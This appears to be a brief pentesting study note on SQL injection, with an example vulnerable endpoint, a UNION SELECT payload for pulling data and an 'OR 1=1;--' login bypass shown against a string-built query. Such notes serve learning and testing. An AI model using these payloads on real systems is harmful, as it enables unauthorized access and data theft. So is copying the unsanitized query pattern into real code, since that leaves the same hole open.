# SQL Injection
Similar to XSS this occurs when developers have not properly santized user inputs.
- [Enumeration Techniques](../../Scanning/Enumeration/sql.md)

## Injection Example
Assume an application has an endpoint like:
```sh
/products/2
```

The SQL might look this, where `2` is the value controlled by the user in the URL:
```sql
SELECT name,description from Products where id = 2;
```

## Selecting Data
Change the value to 0 so that no original data is returned. For a UNION SELECT statement to work, the original table (A) columns need to match your "unioned" table (B). This may be trial and error.
```sql
0 UNION SELECT 1,2
```

## Authentication Bypass
The following example allows a user to inject their own query into both the username and password fields:
```sql
select * from users where username='%username%' and password='%password%' limit 1;
```

A simple bypass. Anything after the `;--` is a comment and ignored:
```sql
select * from users where username='%username%' OR 1=1;-- and password='%password%' limit 1;
```
